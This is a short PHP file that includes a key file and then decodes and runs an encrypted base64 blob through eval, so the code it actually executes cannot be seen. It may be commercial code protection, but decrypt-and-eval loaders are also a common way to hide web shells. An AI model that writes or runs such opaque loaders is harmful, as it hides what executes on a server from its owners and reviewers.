<?php
$keyfile = public_path("key.inc.php");
if(!function_exists('openssl_decrypt')){die('<h2>Function openssl_decrypt() not found !</h2>');}
if(!defined('_FILE_')){define("_FILE_",getcwd().DIRECTORY_SEPARATOR.basename($_SERVER['PHP_SELF']),false);}
if(!defined('_DIR_')){define("_DIR_",getcwd(),false);}
if(file_exists($keyfile)){include_once($keyfile);}else{die("<h2>include: $keyfile not found!</h2>");}
$e7091="QVVSRFpadmZUemU0R2oyVEZvZWx3UUg1aHkvNG5FNHd3WlZ3TzlXTURBWENZZGNoWnlKYVhvZTRuczJIa0pZQ1Nmak1YL1FyUkw4RElNL3k3Zms2a0RwSmd3NldRTzVVVTRUVENKRWVHWUVEM1RzM0poM1YyU2FRaERMdmx1NWY2RUltV2dOQ2Myc1Bza1V5TWFFRnJ3PT0=";eval(e7061($e7091));

